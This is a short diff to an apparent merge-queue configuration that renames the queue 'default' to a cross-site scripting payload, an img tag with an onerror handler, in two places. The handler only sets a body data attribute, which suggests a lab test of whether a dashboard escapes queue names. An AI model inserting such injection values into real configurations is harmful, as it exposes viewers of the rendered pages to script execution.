@@ -1,5 +1,5 @@
 queue_rules:
-  - name: default
+  - name: 'queue-xss-<img src=x onerror=document.body.dataset.queueNameXss=1>'
     queue_conditions:
       - check-success=lab-ci
     merge_conditions:
@@ -12,4 +12,4 @@ pull_request_rules:
       - label=merge-queue
     actions:
       queue:
-        name: default
+        name: 'queue-xss-<img src=x onerror=document.body.dataset.queueNameXss=1>'
